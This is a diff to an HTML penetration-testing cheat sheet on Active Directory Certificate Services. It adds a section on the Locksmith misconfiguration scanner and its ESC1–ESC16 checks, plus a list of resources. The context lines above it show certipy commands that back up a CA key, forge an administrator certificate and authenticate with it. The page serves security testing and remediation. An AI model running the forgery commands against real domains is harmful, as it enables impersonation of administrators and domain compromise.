@@ -247,3 +247,61 @@ certipy ca -backup -u administrator@corp.local -p 'Password123!' -ca 'corp-CA' -
 certipy forge -ca-pfx corp-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator'
 # Use forged certificate:
 certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.5.5</code></pre>
+
+        <h2>Locksmith — AD CS Misconfiguration Scanner</h2>
+        <p>Locksmith is a PowerShell tool that finds and optionally remediates common AD CS misconfigurations. It must run on a domain-joined machine and can scan for ESC1–ESC16 vulnerabilities. Use it both offensively (find exploitable templates) and defensively (remediate issues).</p>
+        <pre><code># Install from PowerShell Gallery:
+Install-Module -Name Locksmith -Scope CurrentUser
+
+# Import the module:
+Import-Module Locksmith
+
+# Mode 0 — Identify issues, output to console (default — offensive use):
+Invoke-Locksmith
+Invoke-Locksmith -Mode 0
+
+# Mode 1 — Issues + remediation steps, console output:
+Invoke-Locksmith -Mode 1
+
+# Mode 2 — Issues only, export to ADCSIssues.CSV:
+Invoke-Locksmith -Mode 2
+
+# Mode 3 — Issues + fixes, export to ADCSRemediation.CSV:
+Invoke-Locksmith -Mode 3
+
+# Mode 4 — Interactive fix-all (offers to remediate each issue):
+Invoke-Locksmith -Mode 4
+
+# Scan for specific ESC vulnerabilities:
+Invoke-Locksmith -Scans ESC1          # ESC1 only
+Invoke-Locksmith -Scans ESC1,ESC2,ESC8  # multiple
+Invoke-Locksmith -Scans All           # all checks
+Invoke-Locksmith -Scans PromptMe      # interactive selection menu
+
+# Supported scan types:
+# ESC1  — enrollee supplies subject (SAN spoofing)
+# ESC2  — Any Purpose EKU or no EKU (template abuse)
+# ESC3  — Certificate Request Agent (enrollment agent abuse)
+# ESC4  — vulnerable template ACL (write access to template)
+# ESC5  — vulnerable PKI object ACL (write to CA, NTAuthCertificates)
+# ESC6  — EDITF_ATTRIBUTESUBJECTALTNAME2 enabled on CA
+# ESC7  — vulnerable CA ACL (manage CA / issue and manage certs)
+# ESC8  — NTLM relay to AD CS HTTP endpoint
+# ESC9  — no security extension in certificate
+# ESC11 — IF_ENFORCEENCRYPTICERTREQUEST disabled
+# ESC13 — OID group link abuse
+# ESC15 — schema version 1 template with SAN (EKEUwu variant)
+# ESC16 — security extension disabled at CA level
+
+# Quick offensive scan (find exploitable templates):
+Invoke-Locksmith -Scans ESC1,ESC3,ESC6,ESC8 -Mode 0</code></pre>
+
+        <h2>Resources</h2>
+        <ul>
+          <li>Certipy — <code>github.com/ly4k/Certipy</code></li>
+          <li>Certify — <code>github.com/GhostPack/Certify</code></li>
+          <li>Locksmith — <code>github.com/jakehildreth/Locksmith</code></li>
+          <li>SpecterOps — Certified Pre-Owned whitepaper — <code>specterops.io/assets/resources/Certified_Pre-Owned.pdf</code></li>
+          <li>MITRE ATT&amp;CK T1649 — Steal or Forge Authentication Certificates — <code>attack.mitre.org/techniques/T1649/</code></li>
+          <li>AD CS attack matrix — <code>github.com/ly4k/Certipy/wiki</code></li>
+        </ul>
